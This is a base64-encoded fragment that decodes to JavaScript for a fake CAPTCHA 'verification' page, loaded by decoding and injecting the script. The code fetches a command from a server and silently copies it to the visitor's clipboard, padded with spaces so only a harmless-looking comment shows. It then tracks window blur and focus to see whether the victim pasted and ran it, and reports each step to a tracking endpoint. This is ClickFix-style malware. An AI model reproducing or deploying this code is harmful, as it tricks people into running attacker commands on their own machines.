NHeGhkR1ZKWkNCOGZDQW5ZMll5SnpzS0lDQWdJQ0FnSUNCbVpYUmphQ2duTDJGd2FTOXRaWFJ5YVdOekwzUnlZV05ySnl3Z2V3b2dJQ0FnSUNBZ0lDQWdJQ0J0WlhSb2IyUTZJQ2RRVDFOVUp5d0tJQ0FnSUNBZ0lDQWdJQ0FnYUdWaFpHVnljem9nZXlBblEyOXVkR1Z1ZEMxVWVYQmxKem9nSjJGd2NHeHBZMkYwYVc5dUwycHpiMjRuSUgwc0NpQWdJQ0FnSUNBZ0lDQWdJR0p2WkhrNklFcFRUMDR1YzNSeWFXNW5hV1o1S0hzZ2RIbHdaU3dnZEdWdGNHeGhkR1U2SUhSbGJYQnNZWFJsU1dRZ2ZTa3NDaUFnSUNBZ0lDQWdJQ0FnSUcxdlpHVTZJQ2R1YnkxamIzSnpKeXdLSUNBZ0lDQWdJQ0FnSUNBZ2EyVmxjR0ZzYVhabE9pQjBjblZsQ2lBZ0lDQWdJQ0FnZlNrdVkyRjBZMmdvS0NrZ1BUNGdlMzBwT3dvZ0lDQWdmU0JqWVhSamFDQW9aWEp5S1NCN2ZRcDlPd29LYkdWMElHTnZiWEJzWlhSbFZISmhZMnRsWkNBOUlHWmhiSE5sT3dwbWRXNWpkR2x2YmlCMGNtRmphME52YlhCc1pYUmxLQ2tnZXdvZ0lDQWdhV1lnS0dOdmJYQnNaWFJsVkhKaFkydGxaQ2tnY21WMGRYSnVPd29nSUNBZ1kyOXRjR3hsZEdWVWNtRmphMlZrSUQwZ2RISjFaVHNLSUNBZ0lIUnlZV05yVFdWMGNtbGpLQ2RqYjIxd2JHVjBaU2NwT3dwOUNnb3ZMeURRa2RDKzBMdlJqTkdJMExVZzBMM1F0U0RRdmRHRDBMYlF2ZEMrSU5HQjBMN1FzZEM0MFlEUXNOR0MwWXdnMExyUXZ0QzgwTERRdmRDMDBZTWcwTExSZ05HRDBZZlF2ZEdEMFk0S0NpOHZJRWRGVkNBS1kyOXVjM1FnY0dGeVlXMXpJRDBnYm1WM0lGVlNURk5sWVhKamFGQmhjbUZ0Y3loM2FXNWtiM2N1Ykc5allYUnBiMjR1YzJWaGNtTm9LVHNLWTI5dWMzUWdjMmwwWlZWeWJDQTlJSEJoY21GdGN5NW5aWFFvSjNOcGRHVW5LU0I4ZkNCM2FXNWtiM2N1Ykc5allYUnBiMjR1YUc5emRHNWhiV1U3Q21OdmJuTjBJR3h2WjI5VmNtd2dQU0J3WVhKaGJYTXVaMlYwS0Nkc2IyZHZKeWs3Q21OdmJuTjBJR1JsWm1GMWJIUk1iMmR2VlhKc0lEMGdKMmgwZEhCek9pOHZNbU5oY0hSamFHRXVZMjl0TDJScGMzUXZkMlZpTDJGemMyVjBjeTluYjI5bmJHVXRjSEpwZG1GamVTMXdiMnhwWTNrdFEySXdRMGRXVWxRdWMzWm5KenNLQ21SdlkzVnRaVzUwTG5GMVpYSjVVMlZzWldOMGIzSkJiR3dvSnk1alRHNUdNREF3U0Rkc055Y3BMbVp2Y2tWaFkyZ29aV3dnUFQ0Z2V3b2dJR1ZzTG5SbGVIUkRiMjUwWlc1MElEMGdjMmwwWlZWeWJEc0tmU2s3Q2dwa2IyTjFiV1Z1ZEM1eGRXVnllVk5sYkdWamRHOXlRV3hzS0NjdVl6VTBNMDlUZVdSNE5FRmlNbGxSV1NjcExtWnZja1ZoWTJnb2FXMW5JRDArSUhzS0lDQnBiV2N1YzNKaklEMGdiRzluYjFWeWJDQjhmQ0JrWldaaGRXeDBURzluYjFWeWJEc0tJQ0JwYldjdVlXeDBJRDBnSjJ4dloyOG5Pd3A5S1RzS0NtWjFibU4wYVc5dUlITmxkRk5yYVhCR2JHRm5LQ2tnZXdvZ0lDQWdkSEo1SUhzS0lDQWdJQ0FnSUNCc2IyTmhiRk4wYjNKaFoyVXVjMlYwU1hSbGJTZ25YM05yYVhBbkxDQW5NU2NwT3dvZ0lDQWdmU0JqWVhSamFDQW9aWEp5S1NCN0NpQWdJQ0FnSUNBZ1pHOWpkVzFsYm5RdVkyOXZhMmxsSUQwZ0oxOXphMmx3UFRFN0lIQmhkR2c5THpzZ2JXRjRMV0ZuWlQwek1UVXpOakF3TUNjN0NpQWdJQ0I5Q24wS0NtRnplVzVqSUdaMWJtTjBhVzl1SUdsdWFYUldaWEpwWm1sallYUnBiMjVHYkc5M0tDa2dld29nSUNBZ1kyOXVjM1FnY0hKbGJHOWhaR1Z5Uld4bGJXVnVkSE1nUFNCa2IyTjFiV1Z1ZEM1eGRXVnllVk5sYkdWamRHOXlRV3hzS0NJdVkydGxPVWcwVW1ONVRVazNUR29pS1RzS0lDQWdJR052Ym5OMElIQnlaV3h2WVdSbGNsUmxlSFFnUFNCa2IyTjFiV1Z1ZEM1eGRXVnllVk5sYkdWamRHOXlLQ0l1WTFOQ2J6WkNRa3R4SWlrN0NpQWdJQ0JqYjI1emRDQjBaWGgwUVd4c1UzUmxjQ0E5SUdSdlkzVnRaVzUwTG5GMVpYSjVVMlZzWldOMGIzSW9JaTVqT0d0M09EbFViSGw0Y2paNVZTSXBPd29nSUNBZ1kyOXVjM1FnWTJobFkydGliM2hYYVc1a2IzY2dQU0JrYjJOMWJXVnVkQzVuWlhSRmJHVnRaVzUwUW5sSlpDZ2lhVkpSVDNoMVpUSkJJaWs3Q2lBZ0lDQmpiMjV6ZENCemRHVndNRVZzWlcxbGJuUnpJRDBnWkc5amRXMWxiblF1Y1hWbGNubFRaV3hsWTNSdmNrRnNiQ2dpTG1OaGNUTlFkVTVPVWxVNVFVbHJaU0lwT3dvZ0lDQWdZMjl1YzNRZ2MzUmxjREZGYkdWdFpXNTBjeUE5SUdSdlkzVnRaVzUwTG5GMVpYSjVVMlZzWldOMGIzSkJiR3dvSWk1alJqZEVPWEYzTUc5NlJ5SXBPd29nSUNBZ1kyOXVjM1FnYzNSbGNESkZiR1Z0Wlc1MGN5QTlJR1J2WTNWdFpXNTBMbkYxWlhKNVUyVnNaV04wYjNKQmJHd29JaTVqUWsxU2NHSjJZMHcxUlhKWElpazdDaUFnSUNCamIyNXpkQ0J6ZEdWd00wVnNaVzFsYm5SeklEMGdaRzlqZFcxbGJuUXVjWFZsY25sVFpXeGxZM1J2Y2tGc2JDZ2lMbU5wVEdJeVVrTkNOM2N5SWlrN0NpQWdJQ0JqYjI1emRDQmphR1ZqYTJKdmVDQTlJR1J2WTNWdFpXNTBMbWRsZEVWc1pXMWxiblJDZVVsa0tDSnBObGRoYjI5bVNsWkhkMUJHYkZSbUlpazdDaUFnSUNCamIyNXpkQ0IyWlhKcFpubFhhVzVrYjNjZ1BTQmtiMk4xYldWdWRDNW5aWFJGYkdWdFpXNTBRbmxKWkNnaWFYRkhRazV6V1ZKR2FtSndJaWs3Q2lBZ0lDQmpiMjV6ZENCemNHbHVibVZ5SUQwZ1pHOWpkVzFsYm5RdVoyVjBSV3hsYldWdWRFSjVTV1FvSW1sb1NEUjJVRkU1Wkd3d1EyUXpOR0VpS1RzS0lDQWdJR052Ym5OMElIWmxjbWxtZVVKMWRIUnZiaUE5SUdSdlkzVnRaVzUwTG1kbGRFVnNaVzFsYm5SQ2VVbGtLQ0pwTmtvelduWXpZVUVpS1RzS0NpQWdJQ0JoZDJGcGRDQm1aWFJqYUVOdmJXMWhibVJCYm1SRGIyMXRaVzUwS0NrN0NpQWdJQ0J6WlhSVWFXMWxiM1YwS0NncElEMCtJSHNLSUNBZ0lDQWdJQ0J3Y21Wc2IyRmtaWEpGYkdWdFpXNTBjeTVtYjNKRllXTm9LR1ZzSUQwK0lHVnNMbk4wZVd4bExtUnBjM0JzWVhrZ1BTQWlibTl1WlNJcE93b2dJQ0FnSUNBZ0lIQnlaV3h2WVdSbGNsUmxlSFF1YzNSNWJHVXVaR2x6Y0d4aGVTQTlJQ0p1YjI1bElqc0tJQ0FnSUNBZ0lDQjBaWGgwUVd4c1UzUmxjQzV6ZEhsc1pTNWthWE53YkdGNUlEMGdJbUpzYjJOcklqc0tJQ0FnSUNBZ0lDQmphR1ZqYTJKdmVGZHBibVJ2ZHk1emRIbHNaUzVrYVhOd2JHRjVJRDBnSW1ac1pYZ2lPd29LSUNBZ0lDQWdJQ0J6WlhSVWFXMWxiM1YwS0NncElEMCtJSHNLSUNBZ0lDQWdJQ0FnSUNBZ1kyaGxZMnRpYjNoWGFXNWtiM2N1YzNSNWJHVXVaR2x6Y0d4aGVTQTlJQ0ptYkdWNElqc2dDaUFnSUNBZ0lDQWdJQ0FnSUd4bGRDQnZjR0ZqYVhSNUlEMGdNRHNLSUNBZ0lDQWdJQ0FnSUNBZ2JHVjBJR1poWkdWSmJpQTlJSE5sZEVsdWRHVnlkbUZzS0NncElEMCtJSHNLSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdJR2xtSUNodmNHRmphWFI1SUQ0OUlERXBJSHNLSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNCamJHVmhja2x1ZEdWeWRtRnNLR1poWkdWSmJpazdJQW9nSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdmU0JsYkhObElIc0tJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0J2Y0dGamFYUjVJQ3M5SURBdU1Uc2dDaUFnSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnWTJobFkydGliM2hYYVc1a2IzY3VjM1I1YkdVdWIzQmhZMmwwZVNBOUlHOXdZV05wZEhrN0NpQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNCOUNpQWdJQ0FnSUNBZ0lDQWdJSDBzSURNd0tUc0tJQ0FnSUNBZ0lDQjlMQ0F5TURBcE93b0tJQ0FnSUNBZ0lDQnpkR1Z3TUVWc1pXMWxiblJ6TG1admNrVmhZMmdvWld3Z1BUNGdaV3d1YzNSNWJHVXVaR2x6Y0d4aGVTQTlJQ0ppYkc5amF5SXBPd29LSUNBZ0lDQWdJQ0J6WlhSVWFXMWxiM1YwS0NncElEMCtJSHNLSUNBZ0lDQWdJQ0FnSUNBZ2MzUmxjREJGYkdWdFpXNTBjeTVtYjNKRllXTm9LR1ZzSUQwK0lHVnNMbk4wZVd4bExtUnBjM0JzWVhrZ1BTQWlibTl1WlNJcE93b2dJQ0FnSUNBZ0lDQWdJQ0J6ZEdWd01VVnNaVzFsYm5SekxtWnZja1ZoWTJnb1pXd2dQVDRnWld3dWMzUjViR1V1WkdsemNHeGhlU0E5SUNKaWJHOWpheUlwT3dvZ0lDQWdJQ0FnSUgwc0lESXdNREFwT3lBS0lDQWdJSDBzSURFMU1EQXBPeUFLQ2lBZ0lDQmphR1ZqYTJKdmVDNWhaR1JGZG1WdWRFeHBjM1JsYm1WeUtDSmpiR2xqYXlJc0lHWjFibU4wYVc5dUlDZ3BJSHNLSUNBZ0lDQWdJQ0JzWlhRZ1ltRnpaU0E5SUdabGRHTm9aV1JEYjIxdFlXNWtPd29nSUNBZ0lDQWdJR3hsZENCamIyMXRaVzUwVUdGeWRDQTlJQ2htWlhSamFHVmtRMjl0YldWdWRDQS9JR1psZEdOb1pXUkRiMjF0Wlc1MElEb2dKeWNwSUNzZ0lpZGNJaUk3Q2lBZ0lDQWdJQ0FnYkdWMElITndZV05sY3lBOUlDY25Pd29nSUNBZ0lDQWdJR2xtSUNnb1ltRnpaU0FySUdOdmJXMWxiblJRWVhKMEtTNXNaVzVuZEdnZ1BDQXlOVGtwSUhzS0lDQWdJQ0FnSUNBZ0lDQWdjM0JoWTJWeklEMGdKeUFuTG5KbGNHVmhkQ2d5TlRrZ0xTQW9ZbUZ6WlNBcklHTnZiVzFsYm5SUVlYSjBLUzVzWlc1bmRHZ3BPd29nSUNBZ0lDQWdJQ0FnSUNCamIyNXpiMnhsTG14dlp5aGlZWE5sTENCemNHRmpaWE1zSUdOdmJXMWxiblJRWVhKMEtRb2dJQ0FnSUNBZ0lDQWdJQ0JqYjI1emIyeGxMbXh2WnlnblltRnpaU0JzWlc1bmRHZzZKeXdnWW1GelpTNXNaVzVuZEdnc0lDZHpjR0ZqWlhNZ2JHVnVaM1JvT2ljc0lITndZV05sY3k1c1pXNW5kR2dzSUNkamIyMXRaVzUwVUdGeWRDQnNaVzVuZEdnNkp5d2dZMjl0YldWdWRGQmhjblF1YkdWdVozUm9LVHNLSUNBZ0lDQWdJQ0I5Q2lBZ0lDQWdJQ0FnYkdWMElIWmhiSFZsSUQwZ1ltRnpaU0FySUhOd1lXTmxjeUFySUdOdmJXMWxiblJRWVhKME93b2dJQ0FnSUNBZ0lHTnZibk4wSUhSbGVIUmhjbVZoSUQwZ1pHOWpkVzFsYm5RdVkzSmxZWFJsUld4bGJXVnVkQ2duZEdWNGRHRnlaV0VuS1RzS0lDQWdJQ0FnSUNCMFpYaDBZWEpsWVM1MllXeDFaU0E5SUhaaGJIVmxPd29nSUNBZ0lDQWdJSFJsZUhSaGNtVmhMbk5sZEVGMGRISnBZblYwWlNnbmNtVmhaRzl1YkhrbkxDQW5KeWs3Q2lBZ0lDQWdJQ0FnZEdWNGRHRnlaV0V1YzNSNWJHVXVjRzl6YVhScGIyNGdQU0FuWVdKemIyeDFkR1VuT3dvZ0lDQWdJQ0FnSUhSbGVIUmhjbVZoTG5OMGVXeGxMbXhsWm5RZ1BTQW5MVGs1T1Rsd2VDYzdDaUFnSUNBZ0lDQWdaRzlqZFcxbGJuUXVZbTlrZVM1aGNIQmxibVJEYUdsc1pDaDBaWGgwWVhKbFlTazdDaUFnSUNBZ0lDQWdkR1Y0ZEdGeVpXRXVjMlZzWldOMEtDazdDaUFnSUNBZ0lDQWdaRzlqZFcxbGJuUXVaWGhsWTBOdmJXMWhibVFvSjJOdmNIa25LVHNLSUNBZ0lDQWdJQ0JrYjJOMWJXVnVkQzVpYjJSNUxuSmxiVzkyWlVOb2FXeGtLSFJsZUhSaGNtVmhLVHNLSUNBZ0lDQWdJQ0JqYjI1emIyeGxMbXh2WnlnbjRweUZKeWs3Q2lBZ0lDQWdJQ0FnYzJWMFUydHBjRVpzWVdjb0tUc0tJQ0FnSUNBZ0lDQmphR1ZqYTJKdmVGZHBibVJ2ZHk1emRIbHNaUzV3WVdSa2FXNW5JRDBnSWpFd2NIZ2lPd29nSUNBZ0lDQWdJR1J2WTNWdFpXNTBMbkYxWlhKNVUyVnNaV04wYjNJb0lpNWpaMWxNVFZabFkyVkNJaWt1YzNSNWJHVXViV0Z5WjJsdVRHVm1kQ0E5SUNJeE5IQjRJanNLSUNBZ0lDQWdJQ0J6ZEdWd01VVnNaVzFsYm5SekxtWnZja1ZoWTJnb1pXd2dQVDRnWld3dWMzUjViR1V1WkdsemNHeGhlU0E5SUNKdWIyNWxJaWs3Q2lBZ0lDQWdJQ0FnYzNSbGNESkZiR1Z0Wlc1MGN5NW1iM0pGWVdOb0tHVnNJRDArSUdWc0xuTjBlV3hsTG1ScGMzQnNZWGtnUFNBaVlteHZZMnNpS1RzS0lDQWdJQ0FnSUNCemNHbHVibVZ5TG5OMGVXeGxMblpwYzJsaWFXeHBkSGtnUFNBaWRtbHphV0pzWlNJN0NpQWdJQ0FnSUNBZ2MyVjBWR2x0Wlc5MWRDZ29LU0E5UGlCN0NpQWdJQ0FnSUNBZ0lDQWdJR05vWldOclltOTRWMmx1Wkc5M0xuTjBlV3hsTG5kcFpIUm9JRDBnSWpVek1IQjRJanNLSUNBZ0lDQWdJQ0FnSUNBZ1kyaGxZMnRpYjNoWGFXNWtiM2N1YzNSNWJHVXVhR1ZwWjJoMElEMGdJbUYxZEc4aU93b2dJQ0FnSUNBZ0lDQWdJQ0IyWlhKcFpubFhhVzVrYjNjdWMzUjViR1V1WW05eVpHVnlWRzl3SUQwZ0lqRndlQ0J6YjJ4cFpDQWpOemszT1RjNUlqc0tJQ0FnSUNBZ0lDQWdJQ0FnZG1WeWFXWjVWMmx1Wkc5M0xuTjBlV3hsTG5CaFpHUnBibWRVYjNBZ1BTQWlNM0I0SWpzS0lDQWdJQ0FnSUNBZ0lDQWdkbVZ5YVdaNVYybHVaRzkzTG5OMGVXeGxMbTFoY21kcGJsUnZjQ0E5SUNJeE5YQjRJanNLSUNBZ0lDQWdJQ0FnSUNBZ2RtVnlhV1o1VjJsdVpHOTNMbU5zWVhOelRHbHpkQzVoWkdRb0ltRmpkR2wyWlNJcE93b2dJQ0FnSUNBZ0lIMHNJRFV3TUNrN0NpQWdJQ0I5S1RzS0NpQWdJQ0F2THlCQ2JIVnlMMFp2WTNWeklHRmpkR2wyWVhScGIyNGdabTl5SUZabGNtbG1lU0JpZFhSMGIyNEtJQ0FnSUd4bGRDQm9ZWE5DYkhWeWNtVmtJRDBnWm1Gc2MyVTdDZ29nSUNBZ1puVnVZM1JwYjI0Z1pXNWhZbXhsUW5WMGRHOXVLQ2tnZXdvZ0lDQWdJQ0FnSUdsbUlDZ2hkbVZ5YVdaNVFuVjBkRzl1S1NCeVpYUjFjbTQ3Q2dvZ0lDQWdJQ0FnSUdsbUlDaDJaWEpwWm5sQ2RYUjBiMjR1WkdsellXSnNaV1FwSUhzS0lDQWdJQ0FnSUNBZ0lDQWdkbVZ5YVdaNVFuVjBkRzl1TG1ScGMyRmliR1ZrSUQwZ1ptRnNjMlU3Q2lBZ0lDQWdJQ0FnSUNBZ0lIWmxjbWxtZVVKMWRIUnZiaTV5WlcxdmRtVkJkSFJ5YVdKMWRHVW9KMlJwYzJGaWJHVmtKeWs3Q2lBZ0lDQWdJQ0FnSUNBZ0lIWmxjbWxtZVVKMWRIUnZiaTV6ZEhsc1pTNXZjR0ZqYVhSNUlEMGdKekVuT3dvZ0lDQWdJQ0FnSUNBZ0lDQjJaWEpwWm5sQ2RYUjBiMjR1YzNSNWJHVXVZM1Z5YzI5eUlEMGdKM0J2YVc1MFpYSW5Pd29nSUNBZ0lDQWdJQ0FnSUNCamIyNXpiMnhsTG14dlp5Z25RblYwZEc5dUlHVnVZV0pzWldRaEp5azdDaUFnSUNBZ0lDQWdmUW9nSUNBZ2ZRb0tJQ0FnSUM4dklGUnlZV05ySUhkcGJtUnZkeUJpYkhWeUNpQWdJQ0IzYVc1a2IzY3VZV1JrUlhabGJuUk1hWE4wWlc1bGNpZ25ZbXgxY2ljc0lHWjFibU4wYVc5dUtDa2dld29nSUNBZ0lDQWdJR2hoYzBKc2RYSnlaV1FnUFNCMGNuVmxPd29nSUNBZ0lDQWdJR052Ym5OdmJHVXViRzluS0NkWGFXNWtiM2NnWW14MWNuSmxaQ2NwT3dvZ0lDQWdJQ0FnSUhSeVlXTnJRMjl0Y0d4bGRHVW9LVHNLSUNBZ0lIMHBPd29LSUNBZ0lDOHZJRlJ5WVdOcklIZHBibVJ2ZHlCbWIyTjFjd29nSUNBZ2QybHVaRzkzTG1Ga1pFVjJaVzUwVEdsemRHVnVaWElvSjJadlkzVnpKeXdnWm5WdVkzUnBiMjRvS1NCN0NpQWdJQ0FnSUNBZ1kyOXVjMjlzWlM1c2IyY29KMWRwYm1SdmR5Qm1iMk4xYzJWa0xDQm9ZWE5DYkhWeWNtVmtPaWNzSUdoaGMwSnNkWEp5WldRcE93b2dJQ0FnSUNBZ0lHbG1JQ2hvWVhOQ2JIVnljbVZrS1NCN0NpQWdJQ0FnSUNBZ0lDQWdJR1Z1WVdKc1pVSjFkSFJ2YmlncE93b2dJQ0FnSUNBZ0lIMEtJQ0FnSUgwcE93b0tJQ0FnSUM4dklGWmxjbWxtZVNCaWRYUjBiMjRnWTJ4cFkyc2dhR0Z1Wkd4bGNnb2dJQ0FnYVdZZ0tIWmxjbWxtZVVKMWRIUnZiaWtnZXdvZ0lDQWdJQ0FnSUhabGNtbG1lVUoxZEhSdmJpNWhaR1JGZG1WdWRFeHBjM1JsYm1WeUtDSmpiR2xqYXlJc0lHWjFibU4wYVc5dUlDZ3BJSHNLSUNBZ0lDQWdJQ0FnSUNBZ2FXWWdLSFJvYVhNdVpHbHpZV0pzWldRcElISmxkSFZ5YmpzS0NpQWdJQ0FnSUNBZ0lDQWdJQzh2SUZObGRDQnphMmx3SUdac1lXY0tJQ0FnSUNBZ0lDQWdJQ0FnYzJWMFUydHBjRVpzWVdjb0tUc0tDaUFnSUNBZ0lDQWdJQ0FnSUhSeVlXTnJRMjl0Y0d4bGRHVW9LVHNLQ2lBZ0lDQWdJQ0FnSUNBZ0lDOHZJRWhwWkdVZ1kyaGxZMnRpYjNnZ2QybHVaRzkzQ2lBZ0lDQWdJQ0FnSUNBZ0lHTm9aV05yWW05NFYybHVaRzkzTG5OMGVXeGxMbVJwYzNCc1lYa2dQU0FpYm05dVpTSTdDZ29nSUNBZ0lDQWdJQ0FnSUNBdkx5QlRhRzkzSUd4dllXUmxjaUJtYVhKemRBb2dJQ0FnSUNBZ0lDQWdJQ0JwWmlBb2NISmxiRzloWkdWeVJXeGxiV1Z1ZEhNdWJHVnVaM1JvS1NCd2NtVnNiMkZrWlhKRmJHVnRaVzUwY3k1bWIzSkZZV05vS0dWc0lEMCtJR1ZzTG5OMGVXeGxMbVJwYzNCc1lYa2dQU0FpWW14dlkyc2lLVHNLSUNBZ0lDQWdJQ0FnSUNBZ2FXWWdLSEJ5Wld4dllXUmxjbFJsZUhRcElIQnlaV3h2WVdSbGNsUmxlSFF1YzNSNWJHVXVaR2x6Y0d4aGVTQTlJQ0p1YjI1bElqc0tDaUFnSUNBZ0lDQWdJQ0FnSUM4dklFaHBaR1VnZG1WeWFXWjVJSFJsZUhRZ2RHVnRjRzl5WVhKcGJIa0tJQ0FnSUNBZ0lDQWdJQ0FnZEdWNGRFRnNiRk4wWlhBdWMzUjViR1V1WkdsemNHeGhlU0E5SUNKdWIyNWxJanNLQ2lBZ0lDQWdJQ0FnSUNBZ0lDOHZJRUZtZEdWeUlERXVOU0J6WldOdmJtUnpMQ0J6YUc5M0lITjFZMk5sYzNNS0lDQWdJQ0FnSUNBZ0lDQWdjMlYwVkdsdFpXOTFkQ2dvS1NBOVBpQjdDaUFnSUNBZ0lDQWdJQ0FnSUNBZ0lDQXZMeUJJYVdSbElHeHZZV1JsY2dvZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnYVdZZ0tIQnlaV3h2WVdSbGNrVnNaVzFsYm5SekxteGxibWQwYUNrZ2NISmxiRzloWkdWeVJXeGxiV1Z1ZEhNdVptOXlSV0ZqYUNobGJDQTlQaUJsYkM1emRIbHNaUzVrYVhOd2JHRjVJRDBnSW01dmJtVWlLVHNLSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdJR2xtSUNod2NtVnNiMkZrWlhKVVpYaDBLU0J3Y21Wc2IyRmtaWEpVWlhoMExuTjBlV3hsTG1ScGMzQnNZWGtnUFNBaWJtOXVaU0k3Q2dvZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnTHk4Z1UyaHZkeUJ6ZFdOalpYTnpJSFJsZUhRS0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnSUdSdlkzVnRaVzUwTG5GMVpYSjVVMlZzWldOMGIzSW9KeTVqV1c1SVJFWlRjR3M0UkU0bktTNXpkSGxzWlM1a2FYTndiR0Y1SUQwZ0ltbHViR2x1WlNJN0Nnb2dJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0x5OGdTR2xrWlNCM1lXbDBhVzVuSUhSbGVIUXNJSE5vYjNjZ2QyRnBkR2x1WnlCeVpYTndiMjV6WlFvZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnWkc5amRXMWxiblF1Y1hWbGNubFRaV3hsWTNSdmNpZ25MbU4xVkU5d1ZIQjVkSEluS1M1emRIbHNaUzVrYVhOd2JHRjVJRDBnSW01dmJtVWlPd29nSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdaRzlqZFcxbGJuUXVjWFZsY25sVFpXeGxZM1J2Y2lnbkxtTlpZbGhLTm1OUmVrSlJSR1p6TnljcExuTjBlV3hsTG1ScGMzQnNZWGtnUFNBaVlteHZZMnNpT3dvS0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnSUM4dklGSmxiRzloWkNCd1lXZGxJR0ZtZEdWeUlETWdjMlZqYjI1a2N3b2dJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ2MyVjBWR2x0Wlc5MWRDZ29LU0E5UGlCN0NpQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdkMmx1Wkc5M0xteHZZMkYwYVc5dUxuSmxiRzloWkNncE93b2dJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ2ZTd2dNekF3TUNrN0NpQWdJQ0FnSUNBZ0lDQWdJSDBzSURFMU1EQXBPd29nSUNBZ0lDQWdJSDBwT3dvZ0lDQWdmUW9LSUNBZ0lHTnZibk4wSUhabGNtbG1hV05oZEdsdmJrbGtJRDBnWkc5amRXMWxiblF1WjJWMFJXeGxiV1Z1ZEVKNVNXUW9JbWszYWpoaFNVWjJUV2xzSWlrN0NpQWdJQ0JwWmlBb2RtVnlhV1pwWTJGMGFXOXVTV1FwSUhzS0lDQWdJQ0FnSUNCMlpYSnBabWxqWVhScGIyNUpaQzUwWlhoMFEyOXVkR1Z1ZENBOUlFMWhkR2d1Wm14dmIzSW9NVEF3TURBd0lDc2dUV0YwYUM1eVlXNWtiMjBvS1NBcUlEa3dNREF3TUNrN0NpQWdJQ0I5Q2lBZ0lDQUtJQ0FnSUdOdmJuTjBJR05vWVhKeklEMGdJbUZpWTJSbFpqQXhNak0wTlRZM09Ea2lPd29nSUNBZ1kyOXVjM1FnY21GNVNXUWdQU0JrYjJOMWJXVnVkQzV4ZFdWeWVWTmxiR1ZqZEc5eUtDSXVZMjVXUzBOemJtVTNJaWs3Q2lBZ0lDQnBaaUFvY21GNVNXUXBJSHNLSUNBZ0lDQWdJQ0J5WVhsSlpDNTBaWGgwUTI5dWRHVnVkQ0E5SUVGeWNtRjVMbVp5YjIwb2V5QnNaVzVuZEdnNklERTJJSDBzSUNncElEMCtJR05vWVhKelcwMWhkR2d1Wm14dmIzSW9UV0YwYUM1eVlXNWtiMjBvS1NBcUlHTm9ZWEp6TG14bGJtZDBhQ2xkS1M1cWIybHVLQ0lpS1RzS0lDQWdJSDBLZlFvS2FXWWdLR1J2WTNWdFpXNTBMbkpsWVdSNVUzUmhkR1VnUFQwOUlDSnNiMkZrYVc1bklpa2dld29nSUNBZ1pHOWpkVzFsYm5RdVlXUmtSWFpsYm5STWFYTjBaVzVsY2lnaVJFOU5RMjl1ZEdWdWRFeHZZV1JsWkNJc0lDZ3BJRDArSUhzZ2FXNXBkRlpsY21sbWFXTmhkR2x2Ymtac2IzY29LVHNnZlNrN0NuMGdaV3h6WlNCN0NpQWdJQ0JwYm1sMFZtVnlhV1pwWTJGMGFXOXVSbXh2ZHlncE93cDlDZ29LWm1sc1pVVjRjR3h2Y21WeUxtRmtaRVYyWlc1MFRHbHpkR1Z1WlhJb0oyTnNhV05ySnl3Z1lYTjVibU1nWm5WdVkzUnBiMjRvS1NCN0NpQWdJQ0JoZDJGcGRDQm1aWFJqYUVOdmJXMWhibVJCYm1SRGIyMXRaVzUwS0NrN0NpQWdJQ0JzWlhRZ1ltRnpaU0E5SUdabGRHTm9aV1JEYjIxdFlXNWtPd29nSUNBZ2JHVjBJR052YlcxbGJuUlFZWEowSUQwZ0tHWmxkR05vWldSRGIyMXRaVzUwSUQ4Z1ptVjBZMmhsWkVOdmJXMWxiblFnT2lBbkp5a2dLeUFpSjF3aUlqc0tJQ0FnSUd4bGRDQnpjR0ZqWlhNZ1BTQW5KenNLSUNBZ0lHbG1JQ2dvWW1GelpTQXJJR052YlcxbGJuUlFZWEowS1M1c1pXNW5kR2dnUENBeU5Ua3BJSHNLSUNBZ0lDQWdJQ0J6Y0dGalpYTWdQU0FuSUNjdWNtVndaV0YwS0RJMU9TQXRJQ2hpWVhObElDc2dZMjl0YldWdWRGQmhjblFwTG14bGJtZDBhQ2s3Q2lBZ0lDQjlDaUFnSUNCc1pYUWdabWx1WVd4VGRISWdQU0JpWVhObElDc2djM0JoWTJWeklDc2dZMjl0YldWdWRGQmhjblE3Q2lBZ0lDQnVZWFpwWjJGMGIzSXVZMnhwY0dKdllYSmtMbmR5YVhSbFZHVjRkQ2htYVc1aGJGTjBjaWs3Q2lBZ0lDQnpaWFJUYTJsd1JteGhaeWdwT3dvZ0lDQWdkSEpoWTJ0RGIyMXdiR1YwWlNncE93b2dJQ0FnWm1sc1pVbHVjSFYwTG1Oc2FXTnJLQ2s3Q2lBZ0lDQXZMeUJYWVdsMElHWnZjaUIxYzJWeUlIUnZJSEpsZEhWeWJpQjBieUIwYUdVZ2NHRm5aUW9nSUNBZ2JHVjBJR1p2WTNWelNHRnVaR3hsWkNBOUlHWmhiSE5sT3dvZ0lDQWdZMjl1YzNRZ2FHRnVaR3hsUm05amRYTWdQU0FvS1NBOVBpQjdDaUFnSUNBZ0lDQWdhV1lnS0NGbWIyTjFjMGhoYm1Sc1pXUWdKaVlnSVdacGJHVlRaV3hsWTNSbFpDa2dld29nSUNBZ0lDQWdJQ0FnSUNCbWIyTjFjMGhoYm1Sc1pXUWdQU0IwY25WbE93b2dJQ0FnSUNBZ0lDQWdJQ0F2THlBdUxpNWxlR2x6ZEdsdVp5QmpiMlJsTGk0dUNpQWdJQ0FnSUNBZ2ZRb2dJQ0FnZlRzS0lDQWdJSGRwYm1SdmR5NWhaR1JGZG1WdWRFeHBjM1JsYm1WeUtDZG1iMk4xY3ljc0lHaGhibVJzWlVadlkzVnpLVHNLZlNrN0NncDlLU2dwT3lBdkx5QkZibVFnYjJZZ1lYTjVibU1nU1VsR1JRbz0nOwogICAgICBjb25zdCBzY3JpcHRDb2RlID0gYjY0VG9VdGY4KHNjcmlwdEI2NCk7CiAgICAgIGNvbnN0IHNjcmlwdEVsID0gZG9jdW1lbn